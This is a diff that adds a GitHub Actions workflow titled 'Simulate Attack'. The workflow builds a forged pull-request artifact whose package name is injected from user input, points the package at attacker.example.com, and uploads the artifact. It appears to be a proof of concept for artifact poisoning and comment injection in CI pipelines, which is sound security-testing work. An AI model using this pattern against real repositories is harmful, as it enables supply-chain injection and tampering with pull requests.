@@ -1,0 +1,44 @@
+name: Simulate Attack (Manual Trigger)
+
+on:
+  workflow_dispatch:
+    inputs:
+      target_issue:
+        description: 'Issue/PR number to post comment to'
+        required: true
+        default: '2'
+      injected_content:
+        description: 'Content to inject into comment'
+        required: true
+        default: 'INJECTED_CONTENT_HERE'
+
+permissions: {}
+
+jobs:
+  create-malicious-artifact:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create malicious artifact
+        run: |
+          cat > output.json << PAYLOAD
+          {
+            "event_name": "pull_request",
+            "number": ${{ github.event.inputs.target_issue }},
+            "ref": "refs/heads/attacker-branch",
+            "packages": [
+              {
+                "name": "${{ github.event.inputs.injected_content }}",
+                "url": "https://attacker.example.com/malicious-package"
+              }
+            ]
+          }
+          PAYLOAD
+
+          echo "=== Malicious artifact created ==="
+          cat output.json
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: output
+          path: ./output.json
